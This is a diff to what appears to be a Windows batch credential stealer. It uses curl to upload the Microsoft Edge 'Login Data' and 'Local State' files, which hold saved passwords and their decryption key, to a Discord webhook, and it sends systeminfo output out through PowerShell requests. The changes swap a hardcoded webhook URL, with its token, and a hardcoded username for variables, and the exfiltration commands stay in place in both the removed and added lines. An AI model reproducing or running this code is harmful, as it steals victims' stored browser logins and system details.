@@ -41,9 +41,10 @@ curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='Edge Browser Info'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
 
-curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "https://discord.com/api/webhooks/1374648627460313199/tBB_fZLPwJHiYudyl2ecc0EwZSG1S0WvVSWbbj6E6D1br4GDgBSGn5Xi1-THSbSmT1Gv"
+curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%webhook_url%"
 
-curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:/Users/Zayn/AppData/Local/Microsoft/Edge/User Data/Local State" "https://discord.com/api/webhooks/1374648627460313199/tBB_fZLPwJHiYudyl2ecc0EwZSG1S0WvVSWbbj6E6D1br4GDgBSGn5Xi1-THSbSmT1Gv"
+curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Local State" "%webhook_url%"
+
 
 :: Run command and process output line by line
 for /f "delims=" %%A in ('systeminfo') do (
@@ -76,18 +77,6 @@ powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body 
 
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
